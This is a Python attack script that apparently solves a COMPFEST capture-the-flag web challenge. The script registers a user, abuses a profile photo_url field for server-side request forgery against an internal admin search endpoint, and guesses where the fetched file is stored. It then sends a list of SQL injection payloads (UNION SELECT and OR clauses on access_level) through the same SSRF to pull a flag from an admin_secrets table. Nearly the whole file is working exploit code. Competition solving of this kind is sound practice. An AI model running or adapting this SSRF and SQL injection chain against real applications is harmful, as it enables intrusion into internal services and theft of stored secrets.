#!/usr/bin/env python3
import requests
import urllib.parse

# Target URL
BASE_URL = "http://ctf.compfest.id:7302"

def register_and_login():
    """Register a new user and login"""
    username = "file_access"
    password = "file123"
    
    # Register
    data = {'username': username, 'password': password}
    requests.post(f"{BASE_URL}/register", data=data)
    
    # Login
    response = requests.post(f"{BASE_URL}/login", data=data, allow_redirects=False)
    if response.status_code == 302:
        return response.cookies, username
    return None, None

def access_uploaded_file():
    """Access the uploaded file directly"""
    print("[+] Accessing uploaded file directly...")
    
    # Get session
    cookies, username = register_and_login()
    if not cookies:
        print("[-] Failed to login!")
        return
    
    print(f"[+] Successfully logged in as: {username}")
    
    # Step 1: Trigger SSRF to upload content
    print("[+] Step 1: Triggering SSRF...")
    
    # Try with empty query first to get secrets with access_level <= 2
    url = "http://127.0.0.1:5000/internal/admin/search"
    
    data = {'photo_url': url}
    
    try:
        response = requests.post(f"{BASE_URL}/profile", data=data, cookies=cookies, timeout=10)
        
        if response.status_code == 200:
            print("[+] SSRF request successful!")
            
            # Step 2: Try to access the uploaded file directly
            print("[+] Step 2: Trying to access uploaded file...")
            
            # Try different possible file paths
            possible_paths = [
                f"uploads/{username}_profile_fetched",
                f"static/uploads/{username}_profile_fetched",
                f"uploads/{username}_profile_fetched.txt",
                f"static/uploads/{username}_profile_fetched.txt",
            ]
            
            for path in possible_paths:
                print(f"[*] Trying path: {path}")
                
                # Try different access methods
                access_urls = [
                    f"{BASE_URL}/{path}",
                    f"{BASE_URL}/static/{path}",
                    f"{BASE_URL}/uploads/{path}",
                ]
                
                for access_url in access_urls:
                    print(f"[*] Trying URL: {access_url}")
                    
                    try:
                        file_response = requests.get(access_url, cookies=cookies, timeout=10)
                        
                        print(f"[+] Status: {file_response.status_code}")
                        print(f"[+] Content-Type: {file_response.headers.get('Content-Type', 'Not set')}")
                        
                        if file_response.status_code == 200:
                            content = file_response.text
                            print(f"[+] File content: {content}")
                            
                            # Look for the flag
                            if "COMPFEST" in content:
                                print("[+] SUCCESS! Found flag in uploaded file!")
                                return
                            elif "Flag" in content or "welcome_note" in content or "author_message" in content:
                                print(f"[+] Found interesting content: {content}")
                                return
                        else:
                            print(f"[-] Failed to access: {file_response.text[:100]}")
                    
                    except Exception as e:
                        print(f"[-] Error accessing {access_url}: {e}")
                        continue
            
            # Step 3: Try with SQL injection to get flag with access_level=3
            print("[+] Step 3: Trying SQL injection to get flag...")
            
            sql_payloads = [
                "access_level' UNION SELECT secret_name,secret_value FROM admin_secrets WHERE access_level=3--",
                "access_level' OR access_level=3--",
                "access_level' OR access_level>2--",
                "access_level' OR access_level>=3--",
            ]
            
            for sql_payload in sql_payloads:
                print(f"[*] Trying SQL injection: {sql_payload}")
                
                full_url = f"http://127.0.0.1:5000/internal/admin/search?q={urllib.parse.quote(sql_payload)}"
                
                data = {'photo_url': full_url}
                
                try:
                    response = requests.post(f"{BASE_URL}/profile", data=data, cookies=cookies, timeout=10)
                    
                    if response.status_code == 200:
                        # Try to access the file again
                        for path in possible_paths:
                            access_url = f"{BASE_URL}/static/{path}"
                            
                            try:
                                file_response = requests.get(access_url, cookies=cookies, timeout=10)
                                
                                if file_response.status_code == 200:
                                    content = file_response.text
                                    
                                    if "COMPFEST" in content:
                                        print(f"[+] SUCCESS! Found flag!")
                                        print(f"[+] Content: {content}")
                                        return
                                    elif "Flag" in content:
                                        print(f"[+] Found flag reference: {content}")
                                        return
                            
                            except Exception as e:
                                continue
                
                except Exception as e:
                    print(f"[-] Error with {sql_payload}: {e}")
                    continue
        
    except Exception as e:
        print(f"[-] Error: {e}")
    
    print("[-] All attempts failed.")

if __name__ == "__main__":
    access_uploaded_file()
